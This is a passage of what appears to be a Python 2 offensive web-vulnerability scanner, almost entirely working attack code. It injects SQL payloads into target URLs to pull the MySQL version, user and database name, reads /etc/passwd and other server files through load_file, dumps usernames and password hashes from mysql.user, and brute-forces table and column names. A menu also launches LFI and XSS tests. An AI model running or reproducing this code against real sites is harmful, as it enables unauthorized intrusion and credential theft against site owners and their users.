				except(KeyboardInterrupt, SystemExit):
					raise
				except:
					pass

			print "\n[!] Sorry column length could not be found\n"
			###########

		print B + "\n[+] Gathering MySQL Server Configuration..."
		for site in darkurl:
			head_URL = site.replace("evilzone",
			                        "concat(0x1e,0x1e,version(),0x1e,user(),0x1e,database(),0x1e,0x20)") + arg_end
			print R + "\n[+] Target:", O + site
			while 1:
				try:
					gets += 1
					source = urllib2.urlopen(head_URL).read()
					match = re.findall("\x1e\x1e\S+", source)
					if len(match) >= 1:
						match = match[0][2:].split("\x1e")
						version = match[0]
						user = match[1]
						database = match[2]
						print W + "\n\tDatabase:", database
						print "\tUser:", user
						print "\tVersion:", version
						version = version[0]

						load = site.replace("evilzone", "load_file(0x2f6574632f706173737764)")
						source = urllib2.urlopen(load).read()
						if re.findall("root:x", source):
							load = site.replace("evilzone", "concat_ws(char(58),load_file(0x" + file.encode(
								"hex") + "),0x62616c74617a6172)")
							source = urllib2.urlopen(load).read()
							search = re.findall("NovaCygni", source)
							if len(search) > 0:
								print "\n[!] w00t!w00t!: " + site.replace("evilzone",
								                                          "load_file(0x" + file.encode("hex") + ")")

							load = site.replace("evilzone",
							                    "concat_ws(char(58),user,password,0x62616c74617a6172)") + arg_eva + "from" + arg_eva + "mysql.user"
						source = urllib2.urlopen(load).read()
						if re.findall("NovaCygni", source):
							print "\n[!] w00t!w00t!: " + site.replace("evilzone",
							                                          "concat_ws(char(58),user,password)") + arg_eva + "from" + arg_eva + "mysql.user"

					print W + "\n[+] Number of tables:", len(tables)
					print "[+] Number of columns:", len(columns)
					print "[+] Checking for tables and columns..."
					target = site.replace("evilzone", "0x62616c74617a6172") + arg_eva + "from" + arg_eva + "T"
					for table in tables:
						try:
							target_table = target.replace("T", table)
							source = urllib2.urlopen(target_table).read()
							search = re.findall("NovaCygni", source)
							if len(search) > 0:
								print "\n[!] w00t!w00t! Found a table called: < " + table + " >"
								print "\n[+] Lets check for columns inside table < " + table + " >"
								for column in columns:
									try:
										source = urllib2.urlopen(target_table.replace("0x62616c74617a6172",
										                                              "concat_ws(char(58),0x62616c74617a6172," + column + ")")).read()
										search = re.findall("NovaCygni", source)
										if len(search) > 0:
											print "\t[!] w00t!w00t! Found a column called: < " + column + " >"
									except(KeyboardInterrupt, SystemExit):
										raise
									except(urllib2.URLError, socket.gaierror, socket.error, socket.timeout):
										pass

								print "\n[-] Done searching inside table < " + table + " > for columns!"

						except(KeyboardInterrupt, SystemExit):
							raise
						except(urllib2.URLError, socket.gaierror, socket.error, socket.timeout):
							pass
					print "[!] Fuzzing is finished!"
					break
				except(KeyboardInterrupt, SystemExit):
					raise

	if chce == '3':
		lfitest()

	if chce == '4':
		xsstest()

	if chce == '5':
		injtest()
		lfitest()

	if chce == '6':
		injtest()
		xsstest()

	if chce == '7':
		lfitest()
		xsstest()

	if chce == '8':
		injtest()
		lfitest()
		xsstest()

	if chce == '9':
		print B + "\nSaving valid urls (" + str(len(finallist)) + ") to file"
		listname = raw_input("Filename: ")
		list_name = open(listname, "w")
		finallist.sort()
		for t in finallist:
			list_name.write(t + "\n")
		list_name.close()
		print "Urls saved, please check", listname

	if chce == '10':
		print W + "\nPrinting valid urls:\n"
		finallist.sort()
		for t in finallist:
			print B + t

	if chce == '11':
		print B + "\nVuln found ", len(vuln)

	if chce == '12':
		Scanner = 1
		print W + ""

	if chce == '0':
		print R + "\n Exiting ..."
		mnu = False
		print W
		sys.exit(0)
